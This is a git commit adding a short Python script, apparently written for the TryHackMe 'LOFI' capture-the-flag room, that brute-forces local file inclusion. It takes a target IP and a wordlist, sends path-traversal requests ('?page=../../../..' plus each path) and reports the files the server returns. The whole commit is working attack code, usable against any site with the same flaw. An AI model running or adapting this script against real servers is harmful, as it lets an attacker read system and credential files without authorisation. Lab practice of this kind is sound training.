80b97220cd2652ae3e3f49da3459e26e1fb47b17
Gusbtc <97497384+Gusbtc@users.noreply.github.com>
2025-02-18 15:22:03 -0300

    Add files via upload

---
+++ lfibrute.py
@@ -0,0 +1,22 @@
+#!/bin/python3
+# Enumerador de LFI feito por GusBTC para a room LOFI do Try Hack Me
+
+import requests
+
+alvo = input('IP da maquina >>> ')
+wordlist = input('Wordlist >>> ')
+
+try:
+	with open (wordlist, "r") as lfi:
+		for i in lfi.readlines():
+			i = i.replace("\n", "")
+			link = f'http://{alvo}/?page=../../../../../../../..{i}'
+			req = requests.get(link)	
+
+			if 'not exist' in req.text:
+				pass
+				#print(f'{i} invalido')
+			else:
+				print(f'{i} ENCONTRADO')
+except KeyboardInterrupt:
+	print('Saindo...')
